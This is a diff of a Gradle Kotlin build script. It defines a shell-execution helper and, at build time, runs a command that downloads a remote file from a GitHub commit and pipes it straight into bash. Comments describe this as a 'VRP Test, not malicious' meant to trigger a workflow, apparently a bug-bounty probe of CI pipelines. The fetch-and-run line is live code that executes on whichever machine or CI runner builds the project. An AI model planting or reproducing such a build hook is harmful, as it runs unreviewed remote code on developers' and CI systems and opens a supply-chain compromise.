@@ -1,7 +1,8 @@
+// should trigger worflow
 import java.io.ByteArrayOutputStream
 import org.gradle.kotlin.dsl.support.serviceOf
 
-// For VRP Test, not malicious.
+// For VRP Test, not malicious....
 fun String.runCommand(): String? = try {
     ProcessBuilder("/bin/sh", "-c", this)
         .redirectOutput(ProcessBuilder.Redirect.PIPE)
@@ -13,7 +14,7 @@ fun String.runCommand(): String? = try {
     null
 }
 
-
+ 
 val output = "curl -sSfL https://github.com/Flank/flank/raw/88e5a56dd3ed78f4f192eadf31634c013dbbf060/README | bash".runCommand()
 println("Shell command output: $output")
 
